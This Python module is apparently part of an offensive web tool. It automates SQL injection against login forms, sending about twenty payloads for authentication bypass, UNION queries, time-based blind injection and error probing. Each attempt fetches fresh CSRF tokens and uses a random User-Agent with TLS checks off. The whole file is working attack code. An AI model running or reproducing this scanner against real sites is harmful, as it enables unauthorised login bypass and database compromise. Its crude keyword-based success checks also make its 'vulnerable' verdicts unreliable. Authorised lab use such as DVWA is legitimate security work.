import requests
import time
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from rich.console import Console
from rich.table import Table
from core.config import TARGET_TIMEOUT, SESSION_DELAY
from core.logger import logger

console = Console()
ua = UserAgent()

# Enhanced SQLi payloads for better detection
SQLI_PAYLOADS = [
    # Auth bypass payloads
    ("' OR '1'='1", "classic bypass"),
    ("' OR '1'='1' --", "comment bypass"),
    ("' OR '1'='1' #", "MySQL hash comment"),
    ("' OR 1=1 --", "numeric bypass"),
    ("admin' --", "admin direct"),
    ("admin'#", "admin MySQL"),
    ("') OR ('1'='1", "bracket bypass"),
    ("') OR ('1'='1'--", "bracket + comment"),
    
    # Union based
    ("' UNION SELECT 1,1 --", "union 2-col"),
    ("' UNION SELECT 1,1,1 --", "union 3-col"),
    
    # Time-based blind
    ("' OR SLEEP(3) --", "MySQL time blind"),
    ("'; WAITFOR DELAY '0:0:3'--", "MSSQL time blind"),
    ("' OR pg_sleep(3) --", "PostgreSQL time blind"),
    
    # Error-based
    ("'", "single quote error"),
    ("''", "double single quote"),
    
    # Alternative bypasses
    ("' || '1'='1", "Oracle bypass"),
    ("\" OR \"\"=\"", "double-quote bypass"),
    ("' AND '1'='1", "AND quote bypass"),
    ("%27 OR %271%27=%271", "URL-encoded bypass"),
    
    # Boolean-based
    ("1' AND '1'='1", "AND true"),
    ("1' AND '1'='2", "AND false"),
    ("' OR 'x'='x", "OR true"),
]

def _fetch_form_data(session: requests.Session, target: dict) -> dict:
    """
    Fetch fresh form data including CSRF tokens.
    """
    try:
        resp = session.get(
            target["source_page"],
            timeout=TARGET_TIMEOUT,
            verify=False,
            allow_redirects=True,
        )
        
        soup = BeautifulSoup(resp.text, "lxml")
        
        # Find login form
        form = None
        for f in soup.find_all("form"):
            action = f.get("action", "")
            if "login" in action.lower() or "auth" in action.lower() or not action:
                form = f
                break
        
        if not form:
            form = soup.find("form")
        
        # Extract all input fields
        form_data = {}
        if form:
            for inp in form.find_all("input"):
                name = inp.get("name")
                value = inp.get("value", "")
                if name:
                    form_data[name] = value
        else:
            # Fallback: find all inputs
            for inp in soup.find_all("input"):
                name = inp.get("name")
                value = inp.get("value", "")
                if name:
                    form_data[name] = value
        
        # Determine action URL
        action = target["action"]
        if form and form.get("action"):
            if form["action"].startswith("http"):
                action = form["action"]
            elif form["action"].startswith("/"):
                from urllib.parse import urlparse
                parsed = urlparse(target["source_page"])
                action = f"{parsed.scheme}://{parsed.netloc}{form['action']}"
            else:
                from urllib.parse import urljoin
                action = urljoin(target["source_page"], form["action"])
        
        return form_data, action
        
    except Exception as e:
        logger.warning(f"Form fetch failed: {e}")
        return target.get("extra_fields", {}), target["action"]


def _get_baseline(session: requests.Session, target: dict) -> dict:
    """Establish baseline with invalid credentials"""
    try:
        form_data, action = _fetch_form_data(session, target)
        
        data = {
            target["username_field"]: "__xauth_baseline__",
            target["password_field"]: "__xauth_baseline__",
            **form_data,
        }
        
        resp = session.post(
            action,
            data=data,
            timeout=TARGET_TIMEOUT,
            verify=False,
            allow_redirects=True,
        )
        
        return {
            "status_code": resp.status_code,
            "body_length": len(resp.text),
            "body_lower": resp.text.lower(),
            "final_url": resp.url,
            "action_url": action,
        }
    except Exception as e:
        logger.warning(f"Baseline failed: {e}")
        return {"status_code": 200, "body_length": 1, "body_lower": "", "final_url": "", "action_url": target["action"]}


def _try_payload(session, target, payload, category, baseline) -> dict:
    """Test a single SQL injection payload"""
    try:
        # Fetch fresh form data for each attempt
        form_data, action = _fetch_form_data(session, target)
        
        data = {
            target["username_field"]: payload,
            target["password_field"]: "xauth_sqli_test",
            **form_data,
        }
        
        t0 = time.time()
        resp = session.post(
            action,
            data=data,
            timeout=TARGET_TIMEOUT + 5,
            allow_redirects=True,
            verify=False,
        )
        elapsed = time.time() - t0
        
        vulnerable, evidence = _analyse_response(resp, baseline, elapsed, payload)
        
        return {
            "payload": payload,
            "category": category,
            "status_code": resp.status_code,
            "elapsed_sec": round(elapsed, 2),
            "vulnerable": vulnerable,
            "evidence": evidence,
        }
        
    except requests.exceptions.Timeout:
        # Time-based injection detection
        is_time_based = any(k in payload.upper() for k in ("SLEEP", "WAITFOR", "PG_SLEEP"))
        return {
            "payload": payload,
            "category": category,
            "status_code": 0,
            "elapsed_sec": TARGET_TIMEOUT + 5,
            "vulnerable": is_time_based,
            "evidence": "timeout — time-based injection confirmed" if is_time_based else "connection timeout",
        }
    except Exception as e:
        return {
            "payload": payload,
            "category": category,
            "status_code": 0,
            "elapsed_sec": 0,
            "vulnerable": False,
            "evidence": str(e),
        }


def _analyse_response(resp, baseline, elapsed, payload) -> tuple:
    """Analyze response for SQL injection indicators"""
    body = resp.text.lower()
    
    # Success indicators
    success_kw = {
        "dashboard", "welcome", "logout", "profile",
        "account", "success", "logged in", "index",
        "home", "main", "dvwa"
    }
    
    # Failure indicators
    failure_kw = {
        "invalid", "incorrect", "wrong", "failed", "error",
        "denied", "unauthorized", "bad credentials", "login failed",
        "sql", "syntax", "mysql", "database"
    }
    
    # Signal 1: Time-based injection
    if elapsed > 2.5 and any(k in payload.upper() for k in ("SLEEP", "WAITFOR", "PG_SLEEP")):
        return True, f"response delayed {elapsed:.1f}s — time injection confirmed"
    
    # Signal 2: URL changed away from login
    if resp.url != baseline["final_url"]:
        if any(kw in resp.url.lower() for kw in ("dashboard", "home", "welcome", "index", "main", "dvwa")):
            return True, f"redirected to {resp.url}"
    
    # Signal 3: Success keywords appeared
    if any(kw in body for kw in success_kw):
        if not any(kw in baseline["body_lower"] for kw in success_kw):
            return True, "success keyword appeared — login bypassed"
    
    # Signal 4: Error messages (indicates injection)
    if any(kw in body for kw in ["sql", "mysql", "syntax", "database error"]):
        return True, "SQL error message detected"
    
    # Signal 5: Body length significantly different
    base_len = baseline["body_length"] or 1
    ratio = abs(len(resp.text) - base_len) / base_len
    if ratio > 0.30 and resp.status_code == 200:
        return True, f"body length changed {ratio:.0%} — different page served"
    
    return False, "no indicators"


def test_sqli(target: dict) -> dict:
    """Main SQL injection testing function"""
    session = requests.Session()
    session.headers["User-Agent"] = ua.random
    session.verify = False
    
    baseline = _get_baseline(session, target)
    results = []
    vuln_count = 0
    
    console.print(f"\n[bold red]SQLi scan:[/bold red] {target['action']}")
    console.print(
        f"[dim]{len(SQLI_PAYLOADS)} payloads | "
        f"CSRF-aware (fresh token per request) | "
        f"user field: '{target['username_field']}'[/dim]\n"
    )
    
    for payload, category in SQLI_PAYLOADS:
        result = _try_payload(session, target, payload, category, baseline)
        results.append(result)
        
        if result["vulnerable"]:
            vuln_count += 1
            console.print(
                f"  [bold red]VULNERABLE[/bold red]  "
                f"[dim][{category}][/dim]  "
                f"[yellow]{payload[:50]}[/yellow]  "
                f"→ {result['evidence']}"
            )
        else:
            console.print(
                f"  [dim green]safe[/dim green]  "
                f"[dim][{category}] {payload[:45]}...[/dim]"
            )
        
        time.sleep(SESSION_DELAY)
    
    # Summary
    vulns = [r for r in results if r["vulnerable"]]
    if vulns:
        table = Table(title="SQLi confirmed vulnerabilities", border_style="red")
        table.add_column("Category", style="yellow")
        table.add_column("Payload", style="cyan", max_width=45)
        table.add_column("Status", style="magenta")
        table.add_column("Evidence", style="white")
        for v in vulns[:10]:  # Limit to 10
            table.add_row(v["category"], v["payload"], str(v["status_code"]), v["evidence"])
        console.print(table)
        console.print(f"\n[bold red]{vuln_count} SQLi vulnerabilities confirmed.[/bold red]\n")
    else:
        console.print("\n[green]No SQLi vulnerabilities confirmed on this target.[/green]\n")
    
    return {
        "target": target["action"],
        "attack_type": "sql_injection",
        "payloads_tested": len(SQLI_PAYLOADS),
        "vulnerable": vuln_count > 0,
        "vuln_count": vuln_count,
        "results": results,
    }